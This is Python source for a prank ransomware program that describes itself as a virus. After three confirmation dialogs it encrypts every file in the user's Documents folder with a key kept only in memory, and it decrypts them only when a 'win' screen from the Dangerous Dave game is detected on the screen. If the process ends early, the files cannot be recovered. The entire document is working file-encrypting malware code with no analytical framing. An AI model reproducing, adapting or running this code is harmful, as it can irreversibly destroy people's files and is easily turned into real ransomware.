import os
import time
import sys
import pyautogui
import pymsgbox
import winsound  
from cryptography.fernet import Fernet

# config
user_home = os.path.expanduser("~")
TARGET_FOLDER = os.path.join(user_home, "Documents")
KEY_FILE = "secret.key"

# warning(s) with sound
def run_warnings():
 
    winsound.MessageBeep(winsound.MB_ICONHAND)
    choice1 = pymsgbox.confirm(
        text="Warning! This is a virus. Please do not run this on your computer, This program will encrypt all files in your Documents folder and overwrite them, the only way to decrypt all of your files is if you win the OG dangerous dave game! if you run it I am not liable for any damages!!!!",
        title="CRITICAL WARNING",
        buttons=['Continue', 'Quit']
    )
    if choice1 == 'Quit': sys.exit()
# winsound sound
    winsound.MessageBeep(winsound.MB_ICONHAND)
    choice2 = pymsgbox.confirm(
        text="Are you sure?",
        title="Verification Required",
        buttons=['Yes', 'No']
    )
    if choice2 == 'No': sys.exit()

    winsound.MessageBeep(winsound.MB_ICONHAND)
    choice3 = pymsgbox.confirm(
        text="THIS IS YOUR FINAL WARNING? DO YOU WANT TO RUN THIS ON YOUR COMPUTER OR LAPTOP?",
        title="FINAL NOTICE",
        buttons=['YES!', 'NO!']
    )
    if choice3 == 'NO!': sys.exit()

# enrcyption engine 
def transform_folder(folder_path, key, mode="encrypt"):
    f = Fernet(key)
    for root, _, files in os.walk(folder_path):
        for file in files:
            if file in [KEY_FILE, "win.png"] or file.endswith(".py"):
                continue
            file_path = os.path.join(root, file)
            try:
                with open(file_path, "rb") as b_file:
                    data = b_file.read()
                result = f.encrypt(data) if mode == "encrypt" else f.decrypt(data)
                with open(file_path, "wb") as b_file:
                    b_file.write(result)
            except:
                continue

# key generating
def run_challenge(folder, memory_key):
    print("\n--- DOCUMENTS LOCKED ---")
    print("The decryption key does not exist yet. Win the game to generate it!")
    
    while True:
        try:
            if pyautogui.locateOnScreen('win.png', confidence=0.8):
                # VICTORY! Now we create the physical key file
                with open(KEY_FILE, "wb") as f:
                    f.write(memory_key)
                
                print("\nVICTORY! Key generated and files restored.")
                winsound.MessageBeep(winsound.MB_OK) # Play success sound
                transform_folder(folder, memory_key, mode="decrypt")
                pymsgbox.alert(f"CONGRATULATIONS! Your key has been generated and saved to {KEY_FILE}", "System Restored")
                break
        except:
            pass
        time.sleep(3)

#script exucution
if __name__ == "__main__":
    run_warnings()
    
    #generate the key in RAM only (not saved to disk yet)
    session_key = Fernet.generate_key()
    
    #lock the library
    transform_folder(TARGET_FOLDER, session_key, mode="encrypt")
    
    # Wait for the win screen to save the key and unlock
    run_challenge(TARGET_FOLDER, session_key)
